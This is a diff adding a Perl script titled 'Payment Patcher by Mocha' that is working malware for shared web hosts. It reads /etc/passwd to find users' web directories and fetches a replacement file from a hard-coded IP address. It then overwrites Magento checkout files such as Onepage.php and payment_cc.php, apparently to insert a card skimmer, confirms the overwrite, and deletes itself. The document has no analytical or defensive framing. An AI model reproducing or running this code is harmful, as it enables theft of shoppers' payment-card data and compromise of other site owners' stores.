@@ -1,0 +1,129 @@
+#!/usr/bin/perl
+use Socket;
+use IO::Socket;
+use IO::Socket::INET;
+use IO::Select;
+#use HTTP::Request;
+use LWP::UserAgent;
+use LWP::Simple;
+#use Sys::Hostname;
+
+my $datetime = localtime;
+my $ftplogin = 1;
+my $homepage = "public_html";
+my $mysource = "http://66.7.217.171/~hhh/.cgi/onepage.txt";
+#my $namehost = hostname();
+#my $hostname = inet_ntoa(scalar(gethostbyname($namehost)) || '127.0.0.1');
+$homepage    = "$ARGV[0]" if $ARGV[0];
+my $logger   = "mag";
+system("rm $0 $logger &>/dev/null");
+putlog(
+"|~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|\n".
+"|~~~[ PAYMENT PATCHER BY MOCHA ]~~~|\n".
+"|~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|\n\n".
+"[X] Localhost   : 127.0.0.1\n".
+"[X] System      : ".`uname -snr`."".
+"[X] Log Created : $datetime\n\n" 
+);
+open(ETCPASS,'/etc/passwd') or die("[X] Cannot open or read /etc/passwd.\n");
+getstore($mysource,"onepage.txt");
+my $totald = 0;
+my $totalr = 0;
+while(<ETCPASS>){
+my ($openconfig) = $_;
+chomp ($openconfig);
+my ($arr_a) = split(/:/,$openconfig);
+my ($arr_b,$arr_c) = split(/:/,reverse($openconfig));
+my ($username) = split(/:/,$arr_a);
+my ($binshell) = split(/:/,reverse($arr_b));
+my ($userhome) = split(/:/,reverse($arr_c));
+if($homepage =~ /^\.$/){ $homepath = "$userhome"; }
+else { $homepath = "$userhome/$homepage"; }
+if(-d $homepath){ $totald++;
+print "$username : $userhome\n"; # print user results
+if(-r $homepath){ $totalr++;
+if(length($userhome) > 2){
+push(@users, "$username:$homepath:$binshell");
+}
+}
+}
+}
+close(ETCPASS);
+print "\n[?] Total username : ($totald)\n";
+print "[?] Total readable : ($totalr)\n\n";
+print "[*] Searching payment files\n\n";
+putlog(
+"[?] Total username : ($totald)\n".
+"[?] Total readable : ($totalr)\n\n".
+"[*] Searching payment files\n\n");
+foreach $hasil (@users){
+my ($name,$home) = split(/:/,$hasil);
+&magento($home,$name);
+}
+print "\n[*] Scanning done\n\n";
+putlog("\n[*] Scanning done\n\n");
+
+sub magento {
+my $path = $_[0];
+my $user = $_[1];
+my @dir;
+opendir(DIRS,$path);
+@dir = readdir(DIRS);
+closedir DIRS;
+foreach $file (@dir){
+my $fullpath = $path."/".$file;
+if(-r $fullpath){
+if(-d $fullpath){
+if(($file ne ".") and ($file ne "..")){
+my $newdir = "$path/$file";
+if($newdir !~ m/\/(root|proc|softaculous)\//g){
+&magento($newdir,$user);
+}
+}
+}
+else {
+if(($file eq "Onepage.php") or ($file eq "onepage.php") or ($file eq "payment_cc.php")){
+&payment($fullpath);
+&ceksave($fullpath);
+}
+}
+}
+}
+}
+sub payment {
+my $filepath = $_[0];
+open(FILES, $filepath);
+while(<FILES>){
+my($line) = $_;
+chomp($line);
+if(($line =~ m/public function savePayment/i)){
+system("cat onepage.txt > $filepath");
+&putlog("\n[M] $filepath\n");
+}
+if(($line =~ m/\/include\/payment_method/i)){
+print "\n[X] $filepath => X-Cart detected\n";
+&putlog("\n[X] $filepath => X-Cart detected\n");
+}
+}
+close(FILES);
+}
+sub ceksave {
+my $filepath = $_[0];
+open(ONEPAGE, $filepath);
+while(<ONEPAGE>){
+my($line) = $_;
+chomp($line);
+if(($line =~ m/zpqSA55SXfw==/i)){
+print "[~] $filepath => Overwrite success\n";
+&putlog("[~] $filepath => Overwrite success\n");
+}
+}
+close(ONEPAGE);
+}
+sub putlog {
+my $data = $_[0];
+open(LOG,">>$logger") or die("[X] Cannot create or open log file.\n");
+print LOG "$data";
+close(LOG);
+}
+system("rm $0 onepage.txt");
